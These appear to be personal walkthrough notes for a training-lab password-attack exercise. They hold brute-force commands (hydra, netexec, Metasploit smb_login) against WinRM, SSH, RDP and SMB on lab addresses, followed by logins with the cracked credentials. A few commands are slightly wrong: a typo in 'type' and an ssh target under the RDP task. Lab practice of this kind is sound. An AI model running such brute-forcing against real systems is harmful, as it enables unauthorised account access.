## Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```
netexec winrm 10.129.22.159 -u username.list -p password.list
evil-winrm -i 10.129.22.159 -u john -p november
type ..\Desktop\flag.txt
```


## Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```
hydra -L username.list -P password.list ssh://10.129.22.159
ssh dennis@10.129.22.159
ype Desktop\flag.txt
```


## Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```
hydra -L username.list -P password.list ssh://10.129.22.159
xfreerdp3 /v:10.129.202.136 /u:chris /p:789456123
```

## Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```
hydra -L username.list -P password.list smb://10.129.202.136

msfconsole -q
use auxiliary/scanner/smb/smb_login
options
set user_file username.list
set pass_file password.list
set rhosts 10.129.202.136
run


netexec smb 10.129.202.136 -u "chris" -p "789456123" --shares
```